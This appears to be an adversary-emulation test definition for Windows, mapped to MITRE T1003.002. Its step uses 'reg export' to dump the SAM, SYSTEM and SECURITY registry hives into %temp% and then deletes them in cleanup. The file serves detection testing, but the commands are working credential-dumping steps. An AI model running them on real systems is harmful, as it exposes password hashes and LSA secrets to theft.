api_version: "2.0"
name: Dumping of SAM, creds, and secrets(Reg Export)
description: |
    Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys. Used reg export to execute this behavior
    Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
uuid: 21df41be-cdd8-4695-a650-c3981113aa3c
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.002: Security Account Manager'
requirements:
    platforms:
        - os: windows
steps:
    - name: dumping-of-sam,-creds,-and-secrets(reg-export)
      inline: |
        reg export HKLM\sam %temp%\sam
        reg export HKLM\system %temp%\system
        reg export HKLM\security %temp%\security
      executor: command_prompt
      cleanup:
        inline: |
            del %temp%\sam >nul 2> nul
            del %temp%\system >nul 2> nul
            del %temp%\security >nul 2> nul
        executor: command_prompt
